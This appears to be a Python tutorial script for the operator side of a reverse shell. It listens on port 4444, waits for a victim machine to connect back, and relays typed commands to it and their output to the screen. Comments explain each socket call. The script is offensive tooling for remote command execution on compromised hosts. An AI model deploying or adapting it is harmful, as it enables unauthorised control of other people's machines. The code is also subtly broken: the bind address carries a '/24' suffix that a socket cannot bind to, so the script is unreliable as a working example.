import socket
import json


def server(ip, port):
    global target

    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #socket.AF_INET - socket will use IPv4 addressing
    #socket.SOCK_STREAM- socket will use TCP protocol

    listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
    #SO_REUSEADDR- reuse the address

    listener.bind((ip, port))
    #bind ip and port when server function is called. Server will listen for incoming connections on this IP and port combination

    listener.listen(0)
    #socket set to listening mode.
    #Arguement 0 - number of unaccepted connections that the system will allow before refusing new connections. (0 means no connections will be queued)

    print('[+] Listening...') #indicates server is listening

    target, address = listener.accept()
    #listener.accept() - blocking call that waits until a client connects to the server
    #listener.accept() will accept 2 values:
    #1) target - a new socket object representing the connection with the client
    #2) address - a tuple containing the client's IP address and port number
    print(f'[+] Got connection from {address}')


def send(data):
    json_data = json.dumps(data)
    target.send(json_data.encode('utf-8'))

def receive():
    json_data=""
    while True:
        try:
            json_data += target.recv(1024).decode('utf-8')
            return json.loads(json_data)
        except ValueError:
            continue

def run():
    while True:
        command = input('Shell#: ')
        send(command)

        result = receive().encode('utf-8')
        print(result.decode('utf-8'))

server('192.168.0.183/24', 4444)
run()